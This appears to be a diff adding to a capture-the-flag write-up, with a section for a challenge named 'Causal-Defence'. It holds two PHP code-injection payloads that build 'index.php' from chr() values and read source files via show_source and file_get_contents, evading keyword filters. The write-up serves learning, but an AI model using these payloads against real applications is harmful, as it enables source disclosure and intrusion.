@@ -49,3 +49,12 @@ if (False) {
 - So if we input `m4 *` which will process the macro `$flag;` and print the flag in the source output.
 
 <img src="solutionparacode.png">
+
+### Challenge : Causal-Defence
+
+Payload : `;show_source(implode(array(chr(105),chr(110),chr(100),chr(101),chr(120),chr(46),chr(112),chr(104),chr(112))));`
+
+- Viewing the the source file index.php by using implode to convert array to string.
+
+Payload : `var_dump((file_get_contents)((substr)(__FILE__,0,-20)));`
+
